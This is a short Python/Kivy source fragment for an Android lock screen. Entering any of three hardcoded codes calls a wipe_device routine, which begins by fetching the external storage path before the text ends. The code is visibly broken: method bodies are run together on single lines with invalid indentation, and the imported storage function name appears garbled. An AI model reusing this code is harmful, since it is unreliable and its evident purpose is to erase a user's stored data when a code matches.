from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen

class LockScreen(Screen):    def verify_code(self, code):        if code == '4@ñG#3pLkX!2Vb9' or \
           code == 'H7b@ÑY5r2tL$g8M' or \
           code == '9zKp*ÑW4@t1rB8X':
            self.wipe_device()        else:
            self.error_popup()    def wipe_device(self):        from android.storage import primary_external_storage_path_evaluate_perm
        path = str(primary_external_storage_path_evaluate_perm())